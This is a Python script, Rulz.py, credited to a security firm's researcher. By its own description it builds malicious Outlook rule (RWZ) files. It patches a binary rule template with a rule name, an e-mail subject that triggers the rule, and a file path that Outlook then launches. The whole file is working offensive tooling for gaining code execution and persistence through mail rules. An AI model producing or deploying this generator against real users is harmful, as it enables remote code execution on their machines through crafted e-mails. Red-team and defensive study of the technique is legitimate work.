#!/usr/bin/env python
# Rulz.py
# Author: Nick Landers (@monoxgas) - Silent Break Security

import os
import sys
import argparse
import re
import binascii
import codecs
 
bNameOffset = 50 #In relation to the start of the file
bRuleLengthOffset = 21 #In relate to bNameOffset (With 0 length name)
bRuleHeaderLength = 24
bSubjectNameOffset = 72 #In relation to bRuleLengthOffset
bPathOffset = 15 #In relate to bSubjectNameOffset (With 0 length subject name)

template = b'\x00\x00\x14\x00\x00\x00\x14\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x14\x00\x07D\x00e\x00f\x00a\x00u\x00l\x00t\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00r\x00\x00\x00\x04\x00\xff\xff\x00\x00\x0c\x00CRuleElement\x90\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x80d\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x80\xcd\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04T\x00e\x00s\x00t\x00\x01\x80I\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x0bC\x00:\x00\\\x00t\x00e\x00s\x00t\x00.\x00t\x00x\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00P\xfa\xa4O\xf6\x92\xe4@\x00\x00\x00\x00'

def main(arguments):
 
	parser = argparse.ArgumentParser(description="Rulz.py - Script for generating malacious Outlook RWZ files.\nCan be imported directly into Outlook\nAuthor: Nick Landers (@monoxgas) - Silent Break Security",
									 formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument('-i', '--input', help="Original Rule file", type=argparse.FileType('rb'))
	parser.add_argument('outfile', help="RWZ to write", type=argparse.FileType('wb'))
 
	args = parser.parse_args(arguments)

	data = template

	if args.input:
		with args.input as f:
			for line in f:
				data = line

	print("\r\nLet's break some rulz...\r\n")

	offset = bNameOffset
	nameLength = data[offset]
	name = data[(offset+1):((offset+1)+nameLength*2)].decode('utf-16le')
	newName = input("Enter a rule name? ("+name+"): ")
	if newName == '': newName = name

	offset = offset+(nameLength*2) + bRuleLengthOffset + bSubjectNameOffset
	subjectNameLength = data[offset]
	subjectName = data[(offset+1):((offset+1)+subjectNameLength*2)].decode('utf-16le')
	newSubjectName = input("Enter a E-Mail subject trigger? ("+subjectName+"): ")
	if newSubjectName == '': newSubjectName = subjectName

	offset = offset+(subjectNameLength*2)+bPathOffset
	pathLength = data[offset]
	path = data[(offset+1):((offset+1)+pathLength*2)].decode('utf-16le')
	newPath = input("Enter a file path? ("+path+"): ")
	if newPath == '': newPath = path

	data = bytearray(data)

	offset = bNameOffset
	newNameLength = len(newName) # Get our newlength
	data[offset] = newNameLength # Write the length
	data[(offset+1):(offset+1)+nameLength*2] = bytearray(newName.encode('utf-16le')) # Replace the data

	ruleLengthOffset = offset+(newNameLength*2)+bRuleLengthOffset

	offset = ruleLengthOffset+bSubjectNameOffset
	newSubjectNameLength = len(newSubjectName)
	data[offset] = newSubjectNameLength
	data[(offset+1):(offset+1)+subjectNameLength*2] = bytearray(newSubjectName.encode('utf-16le'))

	offset = offset+(newSubjectNameLength*2)+bPathOffset
	data[offset] = len(newPath)
	data[(offset+1):(offset+1)+pathLength*2] = bytearray(newPath.encode('utf-16le'))

	data[ruleLengthOffset] = len(data[ruleLengthOffset+bRuleHeaderLength:])

	print("Writing data to file...")

	with args.outfile as w:
		w.write(data)


if __name__ == '__main__':
	sys.exit(main(sys.argv[1:]))